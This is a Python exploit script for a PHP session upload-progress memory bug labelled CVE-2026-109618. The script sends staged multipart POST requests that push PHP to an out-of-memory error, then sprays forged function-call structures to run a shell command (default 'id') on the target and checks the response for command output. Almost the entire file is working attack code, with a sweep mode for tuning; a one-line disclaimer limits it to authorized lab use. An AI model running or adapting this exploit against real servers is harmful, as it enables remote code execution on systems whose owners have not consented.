#!/usr/bin/env python3
"""
CVE-2026-109618 -- OOM during session progress update

Strategy: pre-fill PHP's memory to just below memory_limit using large
form fields, THEN trigger the session progress update. The update's
allocations (session_initialize → read file → decode → hash operations)
push memory over the limit, causing OOM during the progress update's
internal operations.

Pre-patch, longjmp from the failed allocation skips cleanup of the
session progress structures. RSHUTDOWN then operates on them.

For authorized security research and local lab use only.
"""

import argparse
import socket
import struct
import sys
import time


def make_part(boundary, name, body, filename=None):
    disp = f'Content-Disposition: form-data; name="{name}"'
    if filename is not None:
        disp += f'; filename="{filename}"'
    return b"--" + boundary + b"\r\n" + disp.encode() + b"\r\n\r\n" + body


def forge_fcall(call_addr, cmd):
    buf = bytearray(288)
    struct.pack_into("<Q", buf, 0, 64)
    struct.pack_into("<Q", buf, 8, call_addr)
    struct.pack_into("<I", buf, 16, 0x106)
    struct.pack_into("<I", buf, 48, 1)
    struct.pack_into("<B", buf, 64, 1)
    struct.pack_into("<Q", buf, 152, call_addr)
    struct.pack_into("<I", buf, 160, 0x308)
    payload = b"system\x00" + cmd.encode() + b"\x00"
    buf[200:200 + min(len(payload), 80)] = payload[:80]
    return bytes(buf)


def build_exploit(session_id, boundary, prefill_fields, prefill_size,
                  spray_count, spray_value):
    """
    Layout:
    1. PHP_SESSION_UPLOAD_PROGRESS (activates progress tracking)
    2. N large non-file fields (pre-fill memory to near limit)
    3. File "f" header + small data (triggers FILE_START + progress setup)
       === stall here (>1s for min_freq) ===
    4. Small file continuation (triggers FILE_DATA + progress update → OOM during update)
    5. Spray fields (reclaim freed 320-byte bins)
    6. File "g" (FILE_DATA through potentially stale pointers)
    """
    # Phase 1: progress + prefill + file start
    seg1 = b""
    seg1 += make_part(boundary, "PHP_SESSION_UPLOAD_PROGRESS", b"exploit") + b"\r\n"
    for i in range(prefill_fields):
        seg1 += make_part(boundary, f"pad{i}", b"M" * prefill_size) + b"\r\n"
    seg1 += make_part(boundary, "f", b"", filename="upload.bin") + b"\r\n"
    seg1 += b"A" * 4096  # some file data

    # Phase 2: continue file → trigger update → spray → probe
    seg2 = b""
    seg2 += b"B" * 2048 + b"\r\n"  # more file data → triggers second update
    # Spray: reclaim freed 320-byte bins from session arData
    if spray_count > 0 and spray_value:
        for i in range(spray_count):
            seg2 += make_part(boundary, "t[]", spray_value) + b"\r\n"
    # Second file: its FILE_DATA writes through progress structures
    seg2 += make_part(boundary, "g", b"D" * 64, filename="probe.bin") + b"\r\n"
    seg2 += b"--" + boundary + b"--\r\n"

    return seg1, seg2


def send_request(host, port, path, session_id, seg1, seg2, boundary, stall):
    total = len(seg1) + len(seg2)
    headers = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        f"Cookie: PHPSESSID={session_id}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary.decode()}\r\n"
        f"Content-Length: {total}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode()

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(60)
    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)

    try:
        sock.connect((host, port))
        sock.sendall(headers + seg1)
        print(f"    Seg1 sent ({len(seg1)}B), stalling {stall}s...", flush=True)
        time.sleep(stall)
        sock.sendall(seg2)
        print(f"    Seg2 sent ({len(seg2)}B), reading response...", flush=True)

        sock.settimeout(15)
        resp = b""
        while True:
            try:
                chunk = sock.recv(65536)
                if not chunk:
                    break
                resp += chunk
            except socket.timeout:
                break
        sock.close()
        return resp
    except Exception as e:
        try:
            sock.close()
        except Exception:
            pass
        return str(e).encode()


def analyze_response(resp, marker):
    if not resp:
        return "empty", b""

    status_line = resp.split(b"\r\n", 1)[0].decode("latin-1", "replace")
    body = resp.split(b"\r\n\r\n", 1)[-1] if b"\r\n\r\n" in resp else b""

    # Check for RCE
    if marker.encode() in body or b"uid=" in body:
        return "rce", body

    # Check for crash indicators
    if b"502" in resp[:30] or b"503" in resp[:30]:
        return "crash_502", body

    if len(body) == 0:
        return "crash_empty", body

    # Check for OOM
    if b"Allowed memory size" in body:
        idx = body.find(b"Allowed memory size")
        return "oom", body[idx:idx+300]

    # Check for segfault/signal
    if b"Segmentation fault" in body or b"signal 11" in body:
        return "segfault", body

    # Check for anomalous cookie
    for line in resp.split(b"\r\n"):
        if line.lower().startswith(b"set-cookie:") and b"PHPSESSID=" in line:
            cookie_val = line.split(b"PHPSESSID=")[1].split(b";")[0]
            if len(cookie_val) > 40:
                return "memleak_cookie", cookie_val

    return "normal", body


def main():
    ap = argparse.ArgumentParser(
        description="CVE-2026-109618: OOM during session progress update")
    ap.add_argument("cmd", nargs="?", default="id")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=8896)
    ap.add_argument("--path", default="/index.php")
    ap.add_argument("--sid", default="php2shell-update")
    ap.add_argument("--stall", type=float, default=1.5)
    ap.add_argument("--prefill", type=int, default=200,
                    help="Number of prefill fields")
    ap.add_argument("--prefill-size", type=int, default=65536,
                    help="Size of each prefill field")
    ap.add_argument("--spray", type=int, default=149)
    ap.add_argument("--base", default="")
    ap.add_argument("--call", default="")
    ap.add_argument("--attempts", type=int, default=10)
    ap.add_argument("--sweep", action="store_true",
                    help="Sweep prefill count to find OOM sweet spot")
    args = ap.parse_args()

    call_addr = 0
    if args.call:
        call_addr = int(args.call, 0)
    elif args.base:
        call_addr = int(args.base, 0) + 0x6506f0

    boundary = b"php2shell618"
    marker = "PHP2SHELL_RCE"
    full_cmd = f"{args.cmd}; echo {marker}"
    spray_value = forge_fcall(call_addr, full_cmd) if call_addr else b"S" * 288

    if args.sweep:
        print("Sweeping prefill count to find OOM during progress update...")
        print(f"memory_limit should be low (e.g., 16M)")
        print()
        for prefill in range(50, 300, 10):
            sid = f"{args.sid}-sweep-{prefill}"
            seg1, seg2 = build_exploit(sid, boundary, prefill, args.prefill_size,
                                       0, None)
            est_mb = (prefill * args.prefill_size) / (1024 * 1024)
            resp = send_request(args.host, args.port, args.path, sid,
                               seg1, seg2, boundary, args.stall)
            result, data = analyze_response(resp, marker)
            print(f"  prefill={prefill:3d} (~{est_mb:5.1f}MB): {result}", flush=True)
            if result == "oom":
                oom_msg = data.decode("latin-1", "replace")[:120]
                print(f"    {oom_msg}")
            elif result in ("crash_502", "crash_empty", "segfault"):
                print(f"    *** INTERESTING: {result}")
                break
            elif result == "rce":
                print(f"    *** RCE!")
                break
        return

    est_mb = (args.prefill * args.prefill_size) / (1024 * 1024)
    print("=" * 60)
    print("CVE-2026-109618: OOM During Progress Update")
    print("=" * 60)
    print(f"  Target:      http://{args.host}:{args.port}{args.path}")
    print(f"  Prefill:     {args.prefill} x {args.prefill_size}B (~{est_mb:.0f}MB)")
    print(f"  Spray:       {args.spray} x 288B")
    if call_addr:
        print(f"  Call addr:   {hex(call_addr)}")
    print(f"  Stall:       {args.stall}s")
    print()

    for attempt in range(1, args.attempts + 1):
        sid = f"{args.sid}-{attempt}"
        seg1, seg2 = build_exploit(sid, boundary, args.prefill, args.prefill_size,
                                   args.spray, spray_value)

        print(f"[{attempt}/{args.attempts}] sid={sid}")
        resp = send_request(args.host, args.port, args.path, sid,
                           seg1, seg2, boundary, args.stall)
        result, data = analyze_response(resp, marker)
        print(f"    Result: {result}")
        if result == "oom":
            print(f"    {data.decode('latin-1', 'replace')[:120]}")
        elif result == "rce":
            print(f"    [+] RCE CONFIRMED")
            idx = data.find(b"uid=")
            if idx < 0:
                idx = data.find(marker.encode())
            if idx >= 0:
                print(data[max(0, idx-40):idx+200].decode("latin-1", "replace"))
            return 0
        elif result in ("crash_502", "crash_empty", "segfault"):
            print(f"    [!] CRASH detected: {result}")
        elif result == "memleak_cookie":
            print(f"    [!] MEMORY LEAK via PHPSESSID cookie: {data[:80]}")
        print()

    return 1


if __name__ == "__main__":
    sys.exit(main())
